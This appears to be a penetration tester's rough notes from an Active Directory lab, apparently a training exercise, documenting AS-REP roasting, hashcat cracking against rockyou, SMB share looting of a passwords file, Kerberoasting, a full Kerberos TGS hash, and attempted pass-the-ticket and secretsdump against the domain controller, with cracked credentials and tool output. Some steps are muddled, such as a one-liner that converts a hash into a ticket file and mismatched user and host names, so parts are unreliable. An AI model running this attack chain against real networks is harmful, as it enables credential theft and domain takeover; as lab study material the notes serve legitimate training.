# NMAP

enumerated following servers

# Servers

LI1 (10.0.12.29) - Client machine

FS1 (10.0.12.12) - File server

DC1 (10.0.12.11) - Domain controller

# User

debbie:25800ellie (cracked mit hashcat und rockyou)



frank:servicemaster (cracked with rockyou)

User1:P@ssw0rd (von passwords.txt aus 10.0.12.12/Sensitive$)

tracy
dominic
taylor
frank
backup (DC)

# First Findings

Found Website on 10.0.12.12:80 with many names -> in users.txt

# Command with enumerated users
$ impacket-GetNPUsers PLUMETECH.LOCAL/ -dc-ip 10.0.12.11 -no-pass -usersfile users.txt


$ hashcat -m 18200 hash.txt rockyou.txt
debbie:25800ellie


# Command for seeing permissions for martin

$ crackmapexec smb 10.0.12.0/27 -u debbie -p '25800ellie' --shares
SMB         10.0.12.12      445    FS1              [*] Windows Server 2022 Build 20348 x64 (name:FS1) (domain:PLUMETECH.LOCAL) (signing:False) (SMBv1:False)
SMB         10.0.12.29      445    CLI1             [*] Windows Server 2022 Build 20348 x64 (name:CLI1) (domain:PLUMETECH.LOCAL) (signing:False) (SMBv1:False)
SMB         10.0.12.11      445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:PLUMETECH.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.12.12      445    FS1              [+] PLUMETECH.LOCAL\debbie:25800ellie
SMB         10.0.12.29      445    CLI1             [+] PLUMETECH.LOCAL\debbie:25800ellie
SMB         10.0.12.12      445    FS1              [+] Enumerated shares
SMB         10.0.12.12      445    FS1              Share           Permissions     Remark
SMB         10.0.12.12      445    FS1              -----           -----------     ------
SMB         10.0.12.12      445    FS1              ADMIN$                          Remote Admin
SMB         10.0.12.12      445    FS1              C$                              Default share
SMB         10.0.12.12      445    FS1              IPC$            READ            Remote IPC
SMB         10.0.12.12      445    FS1              IT              READ,WRITE
SMB         10.0.12.12      445    FS1              Sensitive$      READ
SMB         10.0.12.11      445    DC1              [+] PLUMETECH.LOCAL\debbie:25800ellie
SMB         10.0.12.29      445    CLI1             [+] Enumerated shares
SMB         10.0.12.29      445    CLI1             Share           Permissions     Remark
SMB         10.0.12.29      445    CLI1             -----           -----------     ------
SMB         10.0.12.29      445    CLI1             ADMIN$                          Remote Admin
SMB         10.0.12.29      445    CLI1             C$                              Default share
SMB         10.0.12.29      445    CLI1             IPC$            READ            Remote IPC
SMB         10.0.12.11      445    DC1              [+] Enumerated shares
SMB         10.0.12.11      445    DC1              Share           Permissions     Remark
SMB         10.0.12.11      445    DC1              -----           -----------     ------
SMB         10.0.12.11      445    DC1              ADMIN$                          Remote Admin
SMB         10.0.12.11      445    DC1              C$                              Default share
SMB         10.0.12.11      445    DC1              CertEnroll      READ            Active Directory Certificate Services share
SMB         10.0.12.11      445    DC1              IPC$            READ            Remote IPC
SMB         10.0.12.11      445    DC1              NETLOGON        READ            Logon server share
SMB         10.0.12.11      445    DC1              SYSVOL          READ            Logon server share

# Enumerating smb

└─$ smbclient -U 'PLUMETECH.LOCAL\debbie' -W 'PLUMETECH.LOCAL' //10.0.12.12/IT
Password for [PLUMETECH.LOCAL\martin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 28 13:06:36 2025
  ..                                  D        0  Thu Mar 27 02:27:44 2025
  email_exports.zip                   A    33024  Thu Mar 27 04:02:47 2025
  IT-Documentation.pdf                A    85848  Thu Mar 27 02:37:01 2025



└─$ smbclient -U 'PLUMETECH.LOCAL\debbie' -W 'PLUMETECH.LOCAL' //10.0.12.12/Sensitive$
Password for [PLUMETECH.LOCAL\debbie]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 27 04:54:06 2025
  ..                                  D        0  Thu Mar 27 04:54:04 2025
  passwords.txt                       A       16  Thu Mar 27 04:54:06 2025
  
etc.....

-> finding User1:P@ssw0rd in passwords.txt -> added to users.txt

# Searching for more users

./PKINITtools/venv/bin/GetUserSPNs.py PLUMETECH/debbie:'25800ellie' -dc-ip 10.0.12.11 -target-domain PLUMETECH.LOCAL -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] KDC IP address and hostname will be ignored because of cross-domain targeting.
ServicePrincipalName                 Name    MemberOf                                         PasswordLastSet             LastLogon  Delegation
-----------------------------------  ------  -----------------------------------------------  --------------------------  ---------  ----------
MegaSVC/DC1.PLUMETECH.LOCAL:54321    david                                                    2025-03-27 01:34:53.303821  <never>
BackupSVC/DC1.PLUMETECH.LOCAL:45454  peter                                                    2025-03-27 01:34:53.538222  <never>
GigaSVC/DC1.PLUMETECH.LOCAL:4444     alfred                                                   2025-03-27 01:34:53.772611  <never>
SuperSVC/DC1.PLUMETECH.LOCAL:1337    calvin                                                   2025-03-27 01:34:53.882220  <never>
UltraSVC/DC1.PLUMETECH.LOCAL:12345   marla   CN=Domain Admins,CN=Users,DC=PLUMETECH,DC=LOCAL  2025-03-27 01:34:53.975718  <never>
  

-> added to users.txt
 
/PKINITtools/venv/bin/GetUserSPNs.py PLUMETECH.LOCAL/debbie:25800ellie -dc-ip 10.0.12.11 -request

  * finding hashes with kerberoast of the names in before documented step
  
# Cracking passwords with hashes

  
hashcat -m 13100 kerberoast.hashes ../rockyou.txt --force
$krb5tgs$23$*frank$PLUMETECH.LOCAL$PLUMETECH.LOCAL/frank*$f975d8ad06cc06fc02a722c77f5c819d$06697cf1a8e3ce676215b4e9ac8e77e09049412c416d99053d819596722366ed680f6e157ebebd3ffd0d83a1fccfa105fd62d3a4c17151a84d8cc43a795cbc8ddabb78eb65cc61a1805f4a3d36711f34dfba6ed7ee57c55680e9a9670d51e0ca8bc537817adad3fed9142f0ef942275b6f839616f3dd4f6fcaa588a0a10bd900a898654217f6a8aa59b5ad8177091214b5f6718bd928b986ff829c6f32e9879bf92daf0ee6acf221eda45ac92d26dee92a91f23ae8cb40ec93e054eaba5ce9fbc3ab23178805e259f157c88437db73c2c2aa824574bb2059cdcb4a27f168763478ced07ad5a54ca51165b39349bf327707ba581c1b1de216416b24505d836a1cc565b882b5643b9e2c8f4900e00c5b93da7d59abc1db445b5a9c427646b0500b825a5f3bc0468f264c6692d6c4dd1fbdcef5b04e2f032ca3fc3e5b05732be9c2580973bf1bf0b033da6d598a844ca49a32b59c01051dbd22292368563e6f656e298804240089d009718f449a46c3f3da82d0166785310554b499702feeb1f112d49adfe1d7be2df7360261664d7f0e37039e468fb6975ddd6a798195907f076e94812521c41b6c670f99d8c55f382206d2797946da71a2c29ea4f64dfe981454138bbb686e7393411d1836574a5ebf775d94a98543fe63682370c123dc70215278befcc73dde348154b355c3a1563e62db70602725c6605794bb6432b819e6b2d643343f3ae7919edf879358ad28b498a74c8f2b6d45e60bd43d5bc25ca9e45cf739e80ab94a69812399549684daa7fbddc6985911dbae7b6d9a9ae8221bfd2069bbe7e9ebd31938ed964037b66bfacc07dc67faf011c21c04a4710bf9b9852f744915b19a446df8599cd04d18249020e6026b0b12ededf883712a820425569bdee58475ad3fba12445af053657ea87b2cdfb0ab8aab405facde7125a7f133a1cd72030e31a4de9b69278fe33fbfd64a2e1197b0d95ad1da8d5dead9a4e81f6d8be4f79b7bf181064f1da5fe0789057691cd8a5b25922efffa136a0c21cf51e7a81680ed88b2fbf2cb2e6307e0db2712212079ef2881996969539be1622d257b074bc68ea93c0d4451016d6ee6fec1ece385e056182736c0daf67608a4b38da0e2de1a62ccbe50bc837a786d5f48d81acec9a9c9d3a6990279f6994f835323d7b4f6ca925b604bef427c5725d93bc77a441c6221da09a2be901bcb04592b501d52719e727f6db072d527c0de19831e3d462a6394129361de833bed9e6b28ba9da167b802c2943182c93b1aeb8d637ee5f512a8438b6c509305f5b40c537fbfae99e7438c5ed218da9c6126a8a50f60afa344e385f6febbbb531c605c5c271e0a0c8352e0e577f2feddb53f783c7baf5488059095e3d9b699c7368556bcd4fdd67d6bf1e6b9d633b5b29e10c4a782136bee3c793085c42be9b599ec83d52ca7cf32fdc7741bb017c505e6aa0dea79:servicemaster
 
-> found password for 
  
  
# Trying to use the TGS ticket of domain controller backup to get find the correlating service for pass-the-ticket-attack?
  
  
echo '$krb5tgs$23$*backup$PLUMETECH.LOCAL$...' > backup_tgs.hash
python3 -c "from binascii import unhexlify; open('backup.ccache','wb').write(unhexlify('$(grep -oP '(?<=\$)[a-f0-9]+' backup_tgs.hash | tr -d '\n')'))"
export KRB5CCNAME=backup.ccache
  
  └─$ impacket-atexec -k -no-pass PLUMETECH.LOCAL/backup@DC1.plumtech.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] This will work ONLY on Windows >= Vista
[-] You need to specify a command to execute!

┌──(kali㉿kali)-[~/kerberoast]
└─$ impacket-secretsdump -k -no-pass PLUMETECH.LOCAL/backup@DC1.plumtech.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Cleaning up...
  
  
  
  
# All users 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[felix] rid:[0x44f]
user:[nina] rid:[0x450]
user:[martin] rid:[0x451]
user:[alice] rid:[0x452]
user:[jack] rid:[0x453]
user:[helpdesk] rid:[0x454]
user:[carrie] rid:[0x455]
user:[tracy] rid:[0x456]
user:[howard] rid:[0x457]
user:[dominic] rid:[0x458]
user:[sabrina] rid:[0x459]
user:[taylor] rid:[0x45a]
user:[frank] rid:[0x45b]
user:[backup] rid:[0x45c]
  
  
  
  
  
  impacket-GetUserSPNs PLUMETECH/debbie:'25800ellie' -dc-ip 10.0.12.11 -target-domain PLUMETECH.LOCAL -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] KDC IP address and hostname will be ignored because of cross-domain targeting.
ServicePrincipalName                 Name    MemberOf                                         PasswordLastSet             LastLogon  Delegation
-----------------------------------  ------  -----------------------------------------------  --------------------------  ---------  ----------
MegaSVC/DC1.PLUMETECH.LOCAL:54321    david                                                    2025-03-27 01:34:53.303821  <never>
BackupSVC/DC1.PLUMETECH.LOCAL:45454  peter                                                    2025-03-27 01:34:53.538222  <never>
GigaSVC/DC1.PLUMETECH.LOCAL:4444     alfred                                                   2025-03-27 01:34:53.772611  <never>
SuperSVC/DC1.PLUMETECH.LOCAL:1337    calvin                                                   2025-03-27 01:34:53.882220  <never>
UltraSVC/DC1.PLUMETECH.LOCAL:12345   marla   CN=Domain Admins,CN=Users,DC=PLUMETECH,DC=LOCAL  2025-03-27 01:34:53.975718  <never>



[-] CCache file is not found. Skipping...
[-] [Errno Connection error (PLUMETECH:88)] [Errno -2] Name or service not known

  
  
└─$ hashcat -m 13100 all_hashes.txt rockyou.txt -O -w 3
